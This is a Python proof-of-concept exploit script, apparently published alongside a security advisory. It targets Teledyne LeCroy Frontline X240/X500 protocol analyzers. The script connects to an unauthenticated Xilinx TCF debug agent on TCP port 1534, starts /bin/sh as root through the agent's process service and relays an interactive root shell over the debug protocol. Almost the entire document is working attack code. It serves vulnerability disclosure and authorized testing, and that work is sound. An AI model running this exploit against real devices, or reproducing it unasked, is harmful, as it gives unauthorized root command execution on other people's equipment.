#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_tcf_shell.py: Interactive root shell over the unauthenticated TCF agent.

Turns the Xilinx TCF debug agent on TCP/1534 into an interactive root shell, entirely over that one port. It subscribes to the ProcessesV1 stream set, starts /bin/sh as root through ProcessesV1.start, and then drives the process stdin and stdout through the TCF Streams service. The spawned shell is persistent, so working directory and environment changes carry across commands. Each command is delimited with a sentinel so the client knows when its output is complete.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Unauthenticated TCF debug agent (TCP/1534) running as root
Advisory: TDY-PSG-2026-001 (CVE pending)
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_tcf_shell.py [host]              # default 10.10.0.240
    then type shell commands; 'exit' or Ctrl-D leaves.
"""

import base64
import json
import os
import socket
import sys

EOM = b"\x03\x01"
PORT = 1534


class TCFClient:
    def __init__(self, host, port=PORT, timeout=10.0):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, port))
        self.token = 0
        self.buf = b""
        self.sock.sendall(b"E\x00Locator\x00Hello\x00[]\x00" + EOM)
        self.sock.settimeout(2.0)
        try:
            while True:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                self.buf += chunk
                if EOM in self.buf and len(chunk) < 8192:
                    break
        except (socket.timeout, TimeoutError):
            pass
        while EOM in self.buf:
            i = self.buf.index(EOM)
            self.buf = self.buf[i + len(EOM):]

    def call(self, service, command, *args, timeout=15.0):
        self.token += 1
        token = str(self.token).encode()
        parts = [b"C", token, service.encode(), command.encode()]
        for a in args:
            parts.append(json.dumps(a).encode())
        self.sock.sendall(b"\x00".join(parts) + b"\x00" + EOM)
        self.sock.settimeout(timeout)
        while True:
            while EOM not in self.buf:
                chunk = self.sock.recv(8192)
                if not chunk:
                    raise IOError("agent closed connection")
                self.buf += chunk
            i = self.buf.index(EOM)
            reply, self.buf = self.buf[:i], self.buf[i + len(EOM):]
            fields = reply.split(b"\x00")
            if fields and fields[0] == b"R" and len(fields) >= 3 and fields[1] == token:
                return fields
            # ignore events and replies to earlier tokens

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


class TCFShell:
    def __init__(self, host):
        self.tcf = TCFClient(host)
        self.host = host
        self.marker = "__TCFEOF_%s__" % base64.b16encode(os.urandom(4)).decode()
        self.tcf.call("Streams", "subscribe", "ProcessesV1")
        fields = self.tcf.call("ProcessesV1", "start", "/", "/bin/sh", ["sh"], [], {"Attach": False})
        res = json.loads(fields[3].decode())
        self.pid = res.get("ID")
        self.stdin = res["StdInID"]
        self.stdout = res["StdOutID"]
        # merge stderr into stdout so command errors are visible too
        self._write("exec 2>&1\n")

    def _write(self, data: str):
        raw = data.encode()
        self.tcf.call("Streams", "write", self.stdin, len(raw), base64.b64encode(raw).decode())

    def _read_until(self, marker: str) -> bytes:
        out = b""
        needle = marker.encode()
        while needle not in out:
            fields = self.tcf.call("Streams", "read", self.stdout, 4096)
            data = fields[2]
            if not data:
                break
            out += base64.b64decode(json.loads(data.decode()))
        return out

    def run(self, cmd: str) -> str:
        self._write(cmd + "\n")
        self._write("echo " + self.marker + "\n")
        out = self._read_until(self.marker)
        text = out.split(self.marker.encode())[0]
        return text.decode("utf-8", "replace")

    def interactive(self):
        who = self.run("id -un").strip() or "root"
        print(f"[+] Connected to TCF agent at {self.host}:{PORT}")
        print(f"[+] Spawned /bin/sh as {who} (process {self.pid}). Interactive shell over TCF.")
        print("[+] Type shell commands. 'exit' or Ctrl-D leaves.\n")
        while True:
            try:
                cmd = input("x240-tcf# ")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd.strip() in ("exit", "quit"):
                break
            if not cmd.strip():
                continue
            sys.stdout.write(self.run(cmd))
            sys.stdout.flush()
        try:
            self._write("exit\n")
        except Exception:
            pass
        self.tcf.close()
        print("[+] Closed the remote shell.")


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.240"
    try:
        TCFShell(host).interactive()
    except (OSError, IOError) as e:
        print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
